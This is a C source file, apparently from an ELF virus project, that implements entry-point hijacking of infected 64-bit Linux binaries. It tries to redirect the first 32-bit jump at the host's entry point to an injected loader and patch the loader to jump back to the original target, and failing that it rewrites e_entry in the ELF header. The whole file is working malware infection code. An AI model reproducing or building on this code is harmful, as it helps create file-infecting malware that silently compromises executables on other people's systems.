#include "virus.h"
#include "disasm.h"
#include "disasm_utils.h"
#include "jumps.h"
#include "compiler_utils.h"
#include "errors.h"
#include "log.h"

static bool	change_header_entry(struct safe_ptr clone_ref,
			Elf64_Xword dist_payload_entry)
{
	log_trying_change_header_entry();

	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	Elf64_Addr	e_entry = hdr->e_entry;

	e_entry += dist_payload_entry;
	hdr->e_entry = e_entry;

	return true;
}

static bool	change_client_jump(struct safe_ptr clone_ref,
			size_t entry_offset, size_t payload_offset,
			size_t dist_jmpclient_loader)
{
	log_trying_change_client_jump();

	// find first client jmp
	const void	*client_jump = find_first_jmp32(clone_ref, entry_offset);

	if (client_jump == NULL)
		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);

	// get pointers
	const size_t	loader_jump_offset = payload_offset + dist_jmpclient_loader;
	const void	*loader_entry_ptr = safe(clone_ref, payload_offset, 0);
	const void	*loader_jump = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);

	if (!loader_jump || !loader_entry_ptr)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);

	// modify jump
	const size_t	client_jump_offset = client_jump - clone_ref.ptr;
	const void	*client_jump_dst = get_jmp32_destination(clone_ref, client_jump_offset);

	if (client_jump_dst == NULL)
		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);

	// get new values
	const int32_t	loader_jump_value = (int32_t)(client_jump_dst - (loader_jump + JUMP32_INST_SIZE));
	const int32_t	client_jump_value = (int32_t)(loader_entry_ptr - (client_jump + JUMP32_INST_SIZE));

	if (!write_jmp32(clone_ref, loader_jump_offset, loader_jump_value)
	|| !write_jmp32(clone_ref, client_jump_offset, client_jump_value))
		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);

	return true;
}

bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry,
		size_t dist_jmpclient_loader)
{
	const Elf64_Xword	sh_offset          = file_entry->safe_shdr->sh_offset;
	const size_t		offset_in_section  = file_entry->offset_in_section;
	const size_t		entry_offset       = sh_offset + offset_in_section;
	const size_t		payload_offset     = file_entry->end_of_last_section;
	const Elf64_Xword	dist_payload_entry = payload_offset - entry_offset;

	if (!change_client_jump(clone_ref, entry_offset, payload_offset, dist_jmpclient_loader)
	&& !change_header_entry(clone_ref, dist_payload_entry))
		return errors(ERR_THROW, _ERR_T_CHANGE_ENTRY);

	return true;
}
